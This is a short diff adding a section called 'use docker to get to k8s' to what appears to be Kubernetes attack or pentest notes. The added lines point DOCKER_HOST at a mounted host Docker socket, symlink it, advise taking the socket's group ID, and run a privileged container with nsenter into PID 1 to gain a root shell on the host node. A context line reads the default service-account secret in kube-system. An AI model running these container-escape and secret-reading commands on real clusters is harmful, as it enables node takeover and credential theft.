@@ -184,6 +184,30 @@ kubectl -n kube-system describe secret default
 
 
 
+use docker to get to k8s
+-----------------------------
+
+
+export DOCKER_HOST=unix:///var/run/docker.sock
+
+export DOCKER_HOST=unix:///tmp/docker.sock
+
+cd /var/run
+
+ln -s /host/var/run/docker/docker.sock docker.sock
+
+assign yourself the GID of the docker.sock file when building the user inside the image if needed.
+
+kubectl exec alpine-with-link-to-docker-socket
+
+
+docker run -it --privileged --pid=host repository.local/alpine:3.14.0 nsenter -t 1 -m -u -i sh
+
+
+
+
+
+
 overrides examples
 --------------------------
 
